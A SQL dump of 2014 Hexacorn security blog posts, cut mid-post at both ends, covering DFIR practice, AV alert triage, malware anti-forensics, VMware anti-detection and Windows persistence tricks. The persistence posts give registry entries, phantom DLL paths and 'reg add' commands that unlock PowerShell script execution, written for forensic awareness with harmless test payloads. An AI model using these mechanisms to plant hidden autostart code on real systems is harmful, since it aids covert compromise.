simpler problem.\nContext is REALLY important. And it dictates what you do and how you do it. And I believe that the context is always driven by the character of the investigation.\nLet’s make an attempt to describe the various ‘levels’ of depths one can reach while doing DFIR work. It all is depending on… yes, you guessed it right – context (or scope).\n\nLaw Enforcements engaged / Criminal case\n\nFull blown forensics with a major stress on accountability/logs/notes, chain of custody; and applied to every possible device you can find on the crime scene\nAlmost always goes to court, or the possibility is pretty high\nYou are SUPERCAREFUL, because everything you do is going to be shown to law interpreters [a.k.a. lawyers :)]\nYou use a very specific, self-protective language to describe your findings\n\n\nConfirmed compromise with more than one aspect of C.I.A. triad being affected (e.g. PCI space, hacking cases)\n\nAlmost identical with the above case, with one extra bit – full forensics for the scoped systems + raw or light forensics in a ‘close neighborhood’\nSurprisingly, it does not go to court that often, but sometimes it does. Whatever you do – do with an assumption it WILL go to the court one day. So, you are still VERY CAREFUL, take care of the chain of custody and statements\nYou also use a very specific, self-protective language to describe your findings\n\n\nDay to day work on the IR/SOC team\n\nYour role is to keep the company secure and literally speaking: find & close incidents\nUsually you do Light forensics for all systems\nOnly and only if deeper intrusion is confirmed raw/full forensics are used\n\n\n\nSame as in school, this is all about grades.\nJust to be precise here: I have used some terms above which require further explanation:\n\nlight forensics – focus on data that is ‘easy’ to acquire with OS-only tools and a minimal impact on the system (minimal contamination) – this is not your memory forensics/ $MFT analysis yet; it is AV logs, “dir /a/s c: > evidence.txt”, “powershell gong foo”, “netstat”, “wmic /xyz/” variations, maybe later on autoruns and Sysinternals tools, etc. + copying it over to your box for further analysis\nraw forensics – maybe there is a better name; if your light forensics didn’t detect anything and you suspect you need more – this is the time when you need to go deeper; natural progression is to look at $MFT and memory\nfull forensics – nothing to add, cuz there is nothing to remove; you go de Saint-Exuperian a.k.a. ballistic on this one & analyze everything & analyze it twice\n\nThe conclusion is this:\n\nIn a typical IR scenario, utilizing tools that are adequate for your task/role is very important\nYou do a MINIMUM first\nOnly, and only if it doesn’t deliver and you suspect you need to go deeper – then you go deeper; $MFT and memory can wait (notably: if you have tools at hand to retrieve $MFT file list w/o much hassle – by all means, do so – it’s fast and it’s better than a file list retrieved by Windows API)\nIn CI/A breaches you better do EVERYTHING you can think of\n\nAnd to add some real-world case scenarios here: when I worked for a bank, we would sometimes have 400 infections in one go.\nEmploying full, or even raw forensics doesn’t make sense ALL THE TIME. All you have to do is to get a process list, file list, kill the bad process, remove the  drive-by exploit and reboot the system, verify all is good after a reboot.\nNo $MFT, no memory analysis. No full forensics.\nThink of the Alexious principle:\n1. What question are you trying to answer?\n2. What data do you need to answer that question?\n3. How do you extract that data?\n4. What does that data tell you?\n…\nShare this :)', 'Compromise Detection, Malware Analysis, Preaching', 'http://www.hexacorn.com/blog/2014/11/27/the-3-stages-of-3ages/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (266, 'Permanent Link to Beyond good ol’ Run key, Part 18', 'Hexacorn', 'November 14, 2014 ', 'If you hear legitimate & legacy in the same sentence then it is – most likely – not a good news.\nThe not-so-known persistence mechanisms that have a reason to be there are quite interesting, because they are often obscure and long forgotten. And while left unknown to a general public they may be still heavily utilized for legitimate purposes even if just by a niche group of people.\nMaybe that’s why the mechanism I am going to describe survived such a long journey from Windows NT to Windows 10 Preview…\nI am talking about Logon Scripts.\nThere is not much online about their internals. The best I could find was this post:\nLogon scripts (both GPO and user) are actually handled by USERINIT.EXE.  If I recall correctly, the user logon script is handled by the same instance of USERINIT.EXE that starts the desktop instance of EXPLORER.EXE (i.e. the one that would be spawned from gina!WlxActivateUserShell), whereas the domain GPO scripts are executed by separate instances of USERINIT.EXE which are requested to be spawned by WINLOGON.EXE via gina!WlxStartApplication.\nThe easy way to screw up the execution of these login scripts (i.e. works fine with MSGINA so I know the configuration is right, but with my replacement GINA installed they no longer run) would be to miss including the expected environment variables that WINLOGON was trying to impart to the spawned instances of USERINIT.EXE, since its via environment variables that the intention for USERINIT.EXE to run a particular script is commuicated.\nBe sure you’re building an environment block that includes all the environment specified in the pEnvironment parameter to the Wlx functions cited.  In the case of GPO scripts you’re looking for an envrionment variable such as “UserInitGPOScriptType”, and “UserInitMprLogonScript” is the environment varibale WlxActivateUserShell is expected to create with the pszMprLogonScript parameter string’s contents.\nThe funny fact is that userinit.exe is relying on environment variables and these can be always abused – this makes it easy to quickly set up a simple persistence mechanism by using the Registry Environment keys.\nThere are 3 environment variables the mechanism relies on:\n\nA pair of UserInitLogonServer & UserInitLogonScript identifying where to run script from; first one identifies the server, the second location\nUserInitMprLogonScript – this one is a simple path to a script; there may be more than one; MPR stands for Multiple Provider Router\n\nThat’s it.\nSetting up the HKEY_CURRENT_USER\\Environment variables and dropping scripts in an appropriate location is enough to pull this off.\nTo test the UserInitMprLogonScript setting:\n\nSave the following file as c:\\test\\UserInitMprLogonScriptlog.bat\n\n@echo off             \r\n@echo # \'UserInitMprLogonScript\' \r\n@if exist c:\\test\\UserInitMprLogonScript.log @del c:\\test\\UserInitMprLogonScript.log\r\n@echo UserInitMprLogonScript executed !> c:\\test\\UserInitMprLogonScript.log\r\n@pause\n\nAdd the following Registry Entry\n\nWindows Registry Editor Version 5.00\r\n\r\n[HKEY_CURRENT_USER\\Environment]\r\n\"UserInitMprLogonScript\"=\"c:\\\\test\\\\UserInitMprLogonScript.bat\"\nOnce you log off and log on again you should see the script running, and if it is not shown in a dedicated terminal window (e.g. in case of Windows 10 Preview) you can confirm it did execute by checking if the file c:\\test\\UserInitMprLogonScript.log exists.\nShare this :)', 'Autostart (Persistence), Compromise Detection, Forensic Analysis', 'http://www.hexacorn.com/blog/2014/11/14/beyond-good-ol-run-key-part-18/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (267, 'Permanent Link to 3R updated to cover new RegRipper plug-ins', 'Hexacorn', 'October 24, 2014 ', 'Two days ago Harlan Carvey pushed his RegRipper to github and on the way added a few new plug-ins so it was a good occasion to update the 3R – the list of registry keys RegRipper covers and its plugins – there are over 300 plug-ins there.\nIf you need to quickly build a new RegRipper plug-in you can always try using 3RPG.\nThx To Harlan for correcting a mistake I made in the original post (incorrect information about new release of RegRipper while it was new plug-ins only).\nShare this :)', '3R, Forensic Analysis', 'http://www.hexacorn.com/blog/2014/10/24/3r-updated-to-cover-regripper-2-8/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (268, 'Permanent Link to Why breaches happen under IR teams noses', 'Hexacorn', 'October 12, 2014 ', 'Having an IR Team is not a guarantee of breach-free life for the organization. In this short post I am trying to list very specific reasons why breaches happen despite IR teams being present and active. Instead of writing yet-another-smart-ass-who-knows-it-all post that talks about ‘events are ignored’, ‘teams are underfunded’, etc. I am trying to list very specific issues that negatively affect the IR team’s work & contribute to actual breaches actually happening (note: the ‘events are ignored’ is not a root cause; it is a result of problems that are rooted much deeper).\nSo, here it is – it’s obviously subjective so use at your own risk:\n\nI think the fundamental problem is that the IR teams don’t hunt i.e. they don’t look at the data their organization generates: AV Alerts, Proxy traffic, DNS queries, etc.\n\nIMHO apart from looking at the alerts generated by security controls this should be the major activity of any IR team\nTriage should be a regular activity on every system; it sounds very difficult logistically, but at the end of the day all you need is something basic e.g. did any Run key change, did any application appear in the %APPDATA% – this can be surely automated company-wide with a few lines of scripting language; introducing such control requires a power of influence though [last point on the list below]\n\n\nInstead:\n\nThey receive tones of emails daily – few hundreds emails a day is not uncommon with 90%+ being absolutely useless.\nThey receive a lot of ‘threat intel’ feeds which they have to often manually parse and incorporate into their own security controls – these are important, but will never be more important than analysis of the internal data generated by the org.\nThey spend too much time evaluating ‘new’ software from vendors; eventually they end up being beta testers of the software instead of looking at the data.\nThey are often bound by the same rules as all other employees: ironically, a hacker who can download and use any tool imaginable is being treated with dir, netstat, wmic; sometimes sysinternals tools (if they are allowed)\nThey are asked to socialize, network and participate in many corporate activities. The number of man hours wasted by endless meetings is incredible.\nThey are often managed by people w/o credentials to do the job – understanding IR requires skills from a large number of disciplines – unfortunately it is not uncommon for the managers to be typical corporate climbers who don’t have a passion for the job. They will also execute their little authority to bring you down if you happen to step on their toes.\nThey are not allowed to work from home (there are some organizations that allow it which is a huge benefit to the organization: working from home allows to use your home lab to analyze malware, research, access resources banned by corporate policies, freely network with others in the industry, it also allows you to really focus on analysis – this is probably the most important bit).\nThey work in the environment full of legacy applications. Old Java, enabled VBA is a major reason why infections happen – upgrading the environment should be really high on C-level folks’ agenda.\nThey are often trained to overestimate the remediation capabilities of security controls e.g. antivirus software (see my post).\nThey are often doing Project Management work deploying solutions instead of actually using them. I would argue one needs separate roles for tool builders and tool users in the successful IR team.\nThey rarely have a power to influence at the C-level. They end up whining with their peers in their cubicles and… nothing changes.\n\n\n\nI don’t think breaches can be prevented 100%, as I argue in my other post every single infection detected by AV is a compromise. Same goes for network alerts. Giving IR team tools and time to deal with all of them is incredibly important so that these small fires can be extinguished quickly. And then give them even more time to hunt.\nSo…. If you want to establish a successful IR program in your org, give your IR team a power to shrug all the useless activities off, kill useless emails at source, train these guys as hell, give them a monitored access to all security controls and most importantly – let them be totally antisocial, but ensure their voice is heard at C-level.\n \nShare this :)', 'Compromise Detection, Preaching', 'http://www.hexacorn.com/blog/2014/10/12/why-breaches-happen-under-ir-teams-noses/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (269, 'Permanent Link to 3 years in blogging', 'Hexacorn', 'October 6, 2014 ', 'October marks the third anniversary of this blog. Since I am not a very nostalgic person I won’t be recalling all the highlights, blunders, mistakes, ups and downs of this piece of the interwebs, but want to take a second to thank all the readers for reading, providing feedback, corrections, suggestions, re-tweets and in general being really cool about this little experiment.\nOn a personal note writing blog is a great educational experience and I encourage anyone who never tried to actually do it and persist. It allows you to connect with lots of smart people sharing the very same passion & profession. You will be surprised how many of them are out there!\nThanks for reading!\n \nShare this :)', 'Hexacorn', 'http://www.hexacorn.com/blog/2014/10/06/3-years-in-blogging/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (270, 'Permanent Link to The art of disrespecting AV (and other old-school controls), Part 2', 'Hexacorn', 'October 5, 2014 ', 'In December 2013 I posted about  ‘The art of disrespecting AV (and other old-school controls)‘. I saw people retweeting it at that time and was quite happy that it generated some small feedback. It was meant to stimulate some discussion, but also be a reflection on security controls in general – it’s sometimes good to just step back and think a bit more on what they are and how to use them properly.\nWell, almost a year later we are witnessing ever increasing number of breaches exposed to the public almost daily (and breaches that are often of gargantuan proportions like JPM) and we also know that they often happened right under the nose of the involved companies.\nHow could that happen?\nMany articles about these breaches mention that ‘alerts were seen, but ignored’.\nIt was this commentary that triggered me to write a part two.\nBefore I begin though: when I published the first part someone made a point – which I missed – that AV is an extra attack surface/vector. Indeed, it is. I did not include it in the first part, so I am now mentioning it to tick all the boxes. I do argue in the part two though that this is not such an important factor considering the tremendous & positive role AV plays in a protection of the company assets.\nLet me explain.\nOver last few years I often witness a ‘romantic’ notion celebrated by the IR/SOC teams which I believe is (sadly) quite universally accepted (and I really do hope I am just imagining it) that:\n\nantivirus detecting stuff is a sign of a bad thing, but since AV includes remediation it solves the problem when it removes bad stuff; there are only two major scenarios considered here:\n\nantivirus detection followed by removal –> good thing, let’s move on, nothing to see here\nantivirus detection followed by a failed removal –> bad thing, we better check this out, but it’s probably a glitch/bug in the antivirus/signatures, or we simply need to reboot the host and if it doesn’t work either do some work by removing the malicious piece manually or recommend rebuilding\n\n\n\nThis is a common approach in many companies. There are also variations of course: alerts from a fixed drive and a removable drive – are they important the same way? Is f.e.x. omnipresent virus Sality or Virut picked up on the removal drive a real deal? Or should we just ‘eventify’ it and move on?\nThere is a very important bit missing in the approach described above and I already mentioned it in the first part. Once the alert triggers we have a few outcomes:\n\nantivirus detected it and removed it – we are good\nantivirus detected it and failed to remove it – we are not so good, but well, we just need to work on this system\nantivirus detected it and maybe even removed, but… what if it didn’t detect some extra malware present on the very same system/attached media?\n\nNowadays when AV detects stuff it often works in a very ‘malicious neighborhood’.\nWhen it does pick up something you should always think of that ‘hood’. So say the AV picked up a PDF exploit, or a JAR file. The fact it deleted it doesn’t matter. Remember that this is a time of professionally written exploit packs and if one doesn’t work, another may. And will. And is most likely delivered the very same moment you received the first alert.\nThat leads me to a single conclusion which I hope you will start promoting in your organization:\nWhen you see an AV alert you need to triage the system, because it has been compromised + there may be still some undetected malware present on it.\n\nTo put it in a more formalized way:\n\nA malware present on the system for which you have received an antivirus alert is an incident\nIt is an incident, because the system already got compromised\nThe reason for calling it a compromise is that antivirus alert is equal to a detection of a malicious agent introduced to the environment (drive-by, removable device, malicious insider, unintentional action of the user, etc.); whether it executes or not, doesn’t matter\n\nHandling AV alerts should be a priority for any IR team – while it will be a common resolution for the alert to become just an event or near-miss [e.g. removable device and nothing else ‘funny’ running on the system] it should be treated as a compromise. And every AV alert should be seen as a big compromise waiting to happen. The scary part is that the number of alerts is crazy – it happens daily, hourly, and in large companies every few minutes.\nUnder the umbrella of ‘business case’ there is always an exposure and rest assured that it’s much easier to exploit users’ gullibility or plain stupidity than spending days trying to find a bug in the AV. Obviously this sort of statement requires some backing in numbers and I can only say that you need to ask your friend administrator what are the statistics on the AV alerts in their company. And then ask if they act on it? You may also compare it against statistics of AV vulnerabilities and how much havoc they spread. And I don’t mean to downplay this aspect of security – it’s just not that important.\nI think the main problem of AV is not its presence, but actually a lack of. Over the years due to complains from users it became completely invisible to the users and admins.  It’s kinda ironic, because it is a direct result of the volume and intrusiveness of the alerts. In the end alerts are ignored or misunderstood, users don’t even know something happens. Only dashboards look nice. (Update: just to clarify – by visibility to users I don’t mean the old-school intrusive alerts popping up on users’ desktops; there are more effective ways for users to react to threats – escalation to managers, daily email alert until it’s removed followed by SMSs if 3 emails are ignored and eventually a call from support, etc. – something along these lines).\nAV alerts mean trouble, they should be visible to the user and you should look at them regularly and triage every single system the alert triggers on. Sounds daunting. And it is. Perhaps that’s why it is called ‘job’ \nShare this :)', 'Compromise Detection, Preaching', 'http://www.hexacorn.com/blog/2014/10/05/the-art-of-disrespecting-av-and-other-old-school-controls-part-2/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (271, 'Permanent Link to Fun with Hanayama Cast Puzzles', 'Hexacorn', 'September 21, 2014 ', 'During my recent trip to Japan I came across a puzzle called Devil’s claw.\n\nWhat followed was a moment (read: a very long moment) of struggle which ended up with a devastating and humiliating defeat of yours truly.\nI was hooked.\nAnd yes, I eventually cracked it :).\n\nAfter coming back home I looked around online and found out that it’s actually a very old puzzle (1906) which many people enjoy for its simplicity and ‘playability’. Even if you solve it once, solving it again is still challenging and it takes some practice to master the moves. It has been revived in 80s by a Japanese company Hanayama. Of course, I immediately started hunting and quickly found a HK-based company that is selling other Hanayama’s puzzles locally. A quick trip to their outlet & the sales girl’s near-heart attack experience concluded with her offering me a discount and me coming back home with over 20 different Hanayama puzzles.\nIf you are curious, these are a few places in Hong Kong where you can buy Hanayama puzzles:\n\nTeen’s Channel in KITEC  (Kowloon Bay) – many different variants [this is the outlet shop I mentioned earlier]\nLog On (Kowloon Tong, Causeway Bay, Tsim Sha Tsui, etc.) – quite a limited choice of puzzles though\n\nThe Hanayama products are also sold outside of Asia and it’s easy to find them on Amazon, Ebay and other shops. Just google around.\nSome of the puzzles are relatively easy f.ex. the cast horse:\n\n\nSome are quite evil e.g. cast square:\n\n\n\nSolving them is a great fun and as I am slowly moving through my stack I can only say that if you like puzzles you will definitely enjoy the Cast series from Hanayama.\nHere is the list of all available mechanical puzzles.\np.s. I am not sponsored by Hanayama and don’t take cut from their sales – they just make awesome puzzles and if you get bored with your smartphone games you will definitely have fun cracking these\np.s.2. I turns out Ange already explored this topic before and in great depth – his collection of puzzles is AMAZING !!!\n\nShare this :)', 'Puzzles', 'http://www.hexacorn.com/blog/2014/09/21/fun-with-hanayama-cast-puzzles/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (272, 'Permanent Link to Beyond good ol’ Run key, Part 17', 'Hexacorn', 'August 31, 2014 ', '.NET components (a couple of DLLs loaded anytime .NET apps are executed) in the Windows 8.X have been somehow modified and when they are loaded they look for an environment variable called APPX_PROCESS. I am not sure what it is – googling around didn’t bring any results, but experimenting with it led me to a discovery of yet another phantom DLL called WinAppXRT.dll. If the environment variable is set anytime some .NET components are loaded they in turn will attempt to load the aforementioned DLL (e.g. launching powershell or any .NET app should be enough).\nSince environment variables can be set via Registry we can use it to develop yet another persistence mechanism.\nAdding the following:\n[HKEY_CURRENT_USER\\Environment]\r\n\"APPX_PROCESS\"=\"1\"\nand dropping the WinAppXRT.dll in e.g. c:\\windows\\system32 (or any other location accessible via PATH) will ensure the WinAppXRT.dll is loaded everytime user launches an application using .NET.\n\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2014/08/31/beyond-good-ol-run-key-part-17/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (273, 'Permanent Link to Anti-forensics – live examples, Part 3', 'Hexacorn', 'August 29, 2014 ', 'I recently spent some time analysing one of the ransomware samples (CryptoWall, md5=73a9ab2ea9ec4eaf45bce88afc7ee87e; thx to Kernelmode.info guys). Looking at the code I came across an interesting routine that the malware author crafted to release memory allocated by malware during run-time. The routine is interesting, because it releases the allocated buffer in a secure way.\nLet’s have a look.\nThe function which I called ZeroFreeDecommitRelease is shown below:\n\nThe querymem function it refers to is just a wrapper for ZwQueryVirtualMemory, and the rest is I hope self-explanatory (btw. the code is position independent so you see reference to getAPITableOffset which is basically a  function returning a pointer to the sample’s import table allocated somewhere in memory).\n\nThere are a few interesting things here:\n\nWhen the function ZwQueryVirtualMemory is called, it uses the MemoryInformation block which is allocated on the stack; if the function succeeded the data from the buffer is passed to the caller and then the MemoryInformation block is cleaned up by zeroes (using the memset function)\nThe ZeroFreeDecommitRelease function:\n\nIs using the querymem wrapper to retrieve information about the block of memory it tries to free; it then tests its page attributes and if it is one of the attributes associated with a writable page it zeroes it first before decommitting it and then releasing it\nIt zeroes the whole region – not necessarily the size of the region requested when the memory was allocated, but the actual region (taking care of page boundaries)\nTaking care of PAGE_WRITECOPY shows attention to details as it is not a page attribute that is often used by your average software / malware and could be omitted saving a few bytes of unnecessary code – the inclusion of this flag makes it look like a proper library function\n\n\n\nThis highlights not only the fact that some malware authors are seasoned developers, but also the fact they pay more and more attention to memory artifacts – buffers allocated by malware during run-time are full of juicy information and often contribute to finding a smoking gun or help in accessing unprotected/unencrypted code and data (e.g. configs) directly from memory. Limiting exposure of such artifacts is a direct challenge to the Locard’s Exchange Principle. It also makes life hard for forensic analysts – relying on dynamic analysis is obviously a daily bread for all of us, but it is simply not enough.\nShare this :)', 'Anti-Forensics, Forensic Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2014/08/29/anti-forensics-live-examples-part-3/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (274, 'Permanent Link to Beyond good ol’ Run key, Part 16', 'Hexacorn', 'August 27, 2014 ', 'Documenting various persistence mechanisms would not be complete without mentioning these that could be based on legitimate and fully-documented system features. One such mechanism we are going to talk about is called ‘custom Power Shell profile’. It is a distant cousin of autoexec.bat and it can be abused to ensure some malware component is loaded anytime someone starts powershell host.\nThere is actually a full article describing this mechanism here, so I will just quote the most important (from the forensics perspective) bit:\n\n%windir%\\system32\\Windows­PowerShell\\v1.0\\profile.ps1\n\nThis is for all users of the computer and for all shells.\n\n\n%windir%\\system32\\Windows­PowerShell\\v1.0\\Microsoft.Power­Shell_profile.ps1\n\nThis is for all users of the computer, but it is only for the Microsoft.PowerShell shell.\n\n\n%UserProfile%\\Documents\\Windows­PowerShell\\profile.ps1\n\nThis is for the current user only and all shells.\n\n\n%UserProfile%\\Documents\\WindowsPowerShell\\Microsoft.PowerShell_profile.ps1\n\nThis is for the current user only and only for the Microsoft.PowerShell shell.\n\n\n\nYou can test it by running the following commands (obviously file writing restrictions apply depending on the OS and the user privileges):\nmd %UserProfile%\\Documents\\WindowsPowerShell\\\r\nmd %windir%\\system32\\WindowsPowerShell\r\nmd %windir%\\system32\\WindowsPowerShell\\v1.0\\\r\n\r\necho echo profile1 >%windir%\\system32\\WindowsPowerShell\\v1.0\\profile.ps1\r\necho echo profile2 >%windir%\\system32\\WindowsPowerShell\\v1.0\\Microsoft.PowerShell_profile.ps1\r\necho echo profile3 >%UserProfile%\\Documents\\WindowsPowerShell\\profile.ps1\r\necho echo profile4 >%UserProfile%\\Documents\\WindowsPowerShell\\Microsoft.PowerShell_profile.ps1\r\n\nand then run PowerShell.\nBtw. If you are wondering what these commands are doing – first 3 ensure the respective directories exist; the next 4 ones create dummy profile files with a simple command ‘echo xyz’, where xyz is a number of the profile. When executed for testing purposes they will simply show you which profile has been loaded by PowerShell. In a real-case scenario these would be replaced with an instruction to launch malware or could be any PowerShell command.\nAnyway, back to the test. You will most likely be surprised to see that PowerShell does not load these profiles without a fight i.e. you may see a couple of error messages.\nThis is because by default the OS policy prevents executing PowerShell scripts (including the profile scripts) and one has to enable them first as documented here.\nThe Windows Registry values guarding this policy are stored under respective hkcu/hklm branches:\nsoftware\\policies\\microsoft\\windows\\powershell\\\n         EnableScripts (REG_DWORD)\r\n         ExecutionPolicy (REG_SZ)\nOne can enforce then script execution by running the following commands (hklm may replace hkcu):\nreg add hkcu\\Software\\Policies\\Microsoft\\Windows\\PowerShell /f /v EnableScripts /t reg_dword /d 1\r\nreg add hkcu\\Software\\Policies\\Microsoft\\Windows\\PowerShell /f /v ExecutionPolicy /t reg_sz /d Unrestricted\r\n\nLaunching PowerShell now will show the following:\n\nYou can download a batch file that I used to test the commands here.\nTested on Windows 8.1 and Windows 7.\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2014/08/27/beyond-good-ol-run-key-part-16/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (275, 'Permanent Link to Protecting VMWare from CPUID hypervisor detection', 'Hexacorn', 'August 25, 2014 ', 'One of the less-known anti-sandbox detection tricks relies on the instruction CPUID that is executed with EAX=1 as an input parameter. When executed the values returned by general purpose registers describe the various Processor Info and Feature Bits. Some malware samples analyse the bit 31th of the value returned in the register ECX; the bit is equal to zero on the real CPU/hypervisor and 1 on the guest VM.\nYou can test this trick by running the following program.\nWhen executed on a real CPU it should give you the following output:\n\n \nOn the guest OS it should (not surprisingly) show the following output:\n\nDepending on your hardware set up and the way your Virtual Platform is executing code you may get different results (modification of virtualization and dynamic translation settings may affect the results).\nBypassing this trick on the code level (e.g. during debugging session or via patching) is not easy as you need to find a sequence of code that is responsible for the detection first. And if the code is metamorphic that won’t be easy (CPUID is just 2 bytes long i.e. 0F A2 and the input values may be initiated using random sequence of code).\nIt turns out VMWare (tested on 10.0.3) supports a mechanism that allows to modify the CPUID instruction results. All you have to do is add the following line to your .vmx file:\ncpuid.1.ecx=\"0---:----:----:----:----:----:----:----\"\nIt instructs the VMWare to mask the 31st bit of ECX when the CPUID instruction is executed. As such, running the same program on the re-configured VM will give you the output as seen on the first screenshot i.e. CPUID returns value observed on the real CPU; malware running on such re-configured VM will get fooled and the sandbox detection can be bypassed.\nNote: I am not an expert in VMWare configuration – any modification you do to your VM is on your own risk. If you break anything it’s your own fault \nI encourage you to explore VMWare forums before doing any modification to your setup. Also, remember that you need to fully restart the VM (and the guest system) for the change to take place (it won’t work for a restart from a snapshot).\nShare this :)', 'Malware Analysis, Tips & Tricks', 'http://www.hexacorn.com/blog/2014/08/25/protecting-vmware-from-cpuid-hypervisor-detection/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (276, 'Permanent Link to Beyond good ol’ Run key, Part 15', 'Hexacorn', 'August 4, 2014 ', 'Today I am going to show you yet another debugging mechanism that allows to load a couple of phantom DLLs.\nThis time the culprit is DirectX.\nThe DirectX is pretty much a standard for programming anything that is multimedia-related on Windows. Since this includes games, animations, demos, as well as video players, picture viewers, etc. the phantom DLLs (they are debug DLLs in this case) can be easily made persistent because they will be loaded anytime one of such DirectX-aware applications starts.\nDropping one (or both) of these DLLs:\n\nd3d8d.dll\nd3d9d.dll\n\nin one of the directories covered by the PATH variable and adding the following Registry Entry\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Direct3D]\r\n@=\"\"\r\n\"LoadDebugRuntime\"=dword:00000001\r\n\r\n\nwill ensure that these DLLs will be loaded anytime a Direct X (its component called Direct 3D) is being used by some application. They are loaded by respective Direct X versions (8 or 9).\nTo test on XP (DirectX version 8 still is being used by dxdiag):\n\nAdd the registry entry\nDrop test d3d8d.dll and d3d9d.dll into e.g. c:\\windows\\system32 directory\nRun dxdiag\nGo to Display tab\nClick Test Direct 3D\nYou should see that d3d9d.dll is loaded when dxdiag starts and d3d8d.dll loads when you test Direct 3D feature on the Display tab\n\nTo test on Win 7 (DirectX version 8 doesn’t seem to be used by dxdiag, but DLLs are present and applications loading Direct X 8 libraries will _still_ load the DLLs):\n\nAdd the registry entry\nDrop test d3d9d.dll into e.g. c:\\windows\\system32 directory\nRun dxdiag\nYou should see that d3d9d.dll is loaded when dxdiag starts\n\nIn other words, it should work on all OSes that have the Direct X 8 or 9 installed.\nYou may be wondering if the same trick works for newer versions of DirectX.\nIt does.\nThe naming convention stays the same (e.g. d3d10d.dll, d3d11d.dll), but the major change is that:\n\nThe loading is not system-wide (or, more specifically DirectX-ecosystem wide), but application specific, hence a different registry entry is being used to load these DLLs\n\ne.g. for dxdiag it would be\n\n\nHKEY_CURRENT_USER\\Software\\\n Microsoft\\Direct3D\\dxdiag\\\n D3D10LoadDebugRuntime=1\n\n\n\n\n\nThe DLLs (e.g. d3d10d.dll) are loaded only under very specific circumstances (only a couple of Direct X functions related to shaders load the debug DLLs) so chance for it to be a successful persistent mechanism are much lower\n\nI guess the DLLs are used to test performance of the graphic primitives, but I have no programming experience with Direct X so can only speculate here\n\n\n\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2014/08/04/beyond-good-ol-run-key-part-15/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (277, 'Permanent Link to Beyond good ol’ Run key, Part 14', 'Hexacorn', 'July 8, 2014 ', 'I have mentioned in my older posts that tracing, logging, debugging and various plugins, extensions and internal performance testing and development tools can be used and abused as a persistence mechanism; today’s topic is yet another list of phantom DLLs – this time courtesy of Windows Problem Reporting.\nWhen applications crash on newer versions of Windows the WerFault.exe program is executed (subject to system’s settings); when launched at some stage it will try to locate and load the following files:\n\ndbghelp.dll\next.dll\nexts.dll\nntsdexts.dll\nuext.dll\nwow64log.dll\n\nThe last one on the list may look familiar, I mentioned it in the part 5.\nThese DLLs are various debugger extensions that WerFault tries ‘to talk to’ when the crash occurs; the paths that WerFault is walking through is according to the Extension DLL search path – I believe this path is hard coded inside WerFault and can’t be changed (that could be yet another way to fool WerFault to look for the DLLs in other directories), but can be changed if the extensions are loaded from under WinDbg or other compatible with them debugger.\nThe searching activity can be easily observed using a Process Monitor and on my test system Windows 8.1 it is walking through a couple of C:\\Windows\\ sub-directories; the list below is a combined list from both 32- and 64-bit versions:\n\nC:\\Windows\\ext.dll\nC:\\Windows\\exts.dll\nC:\\Windows\\ntsdexts.dll\nC:\\Windows\\System32\\ext.dll\nC:\\Windows\\System32\\exts.dll\nC:\\Windows\\System32\\ntsdexts.dll\nC:\\Windows\\system32\\pri\\dbghelp.dll\nC:\\Windows\\system32\\pri\\ext.dll\nC:\\Windows\\system32\\pri\\exts.dll\nC:\\Windows\\system32\\pri\\ntsdexts.dll\nC:\\Windows\\system32\\pri\\uext.dll\nC:\\Windows\\System32\\uext.dll\nC:\\Windows\\System32\\wbem\\ext.dll\nC:\\Windows\\System32\\wbem\\exts.dll\nC:\\Windows\\System32\\wbem\\ntsdexts.dll\nC:\\Windows\\System32\\wbem\\uext.dll\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\ext.dll\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\exts.dll\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\ntsdexts.dll\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\uext.dll\nC:\\Windows\\system32\\winext\\arcade\\dbghelp.dll\nC:\\Windows\\system32\\winext\\arcade\\ext.dll\nC:\\Windows\\system32\\winext\\arcade\\exts.dll\nC:\\Windows\\system32\\winext\\arcade\\ntsdexts.dll\nC:\\Windows\\system32\\winext\\arcade\\uext.dll\nC:\\Windows\\system32\\winext\\dbghelp.dll\nC:\\Windows\\system32\\winext\\ext.dll\nC:\\Windows\\system32\\winext\\exts.dll\nC:\\Windows\\system32\\winext\\ntsdexts.dll\nC:\\Windows\\system32\\winext\\uext.dll\nC:\\Windows\\system32\\WINXP\\dbghelp.dll\nC:\\Windows\\system32\\WINXP\\ext.dll\nC:\\Windows\\system32\\WINXP\\exts.dll\nC:\\Windows\\system32\\WINXP\\ntsdexts.dll\nC:\\Windows\\system32\\WINXP\\uext.dll\nC:\\Windows\\System32\\wow64log.dll\nC:\\Windows\\SysWOW64\\ext.dll\nC:\\Windows\\SysWOW64\\exts.dll\nC:\\Windows\\SysWOW64\\ntsdext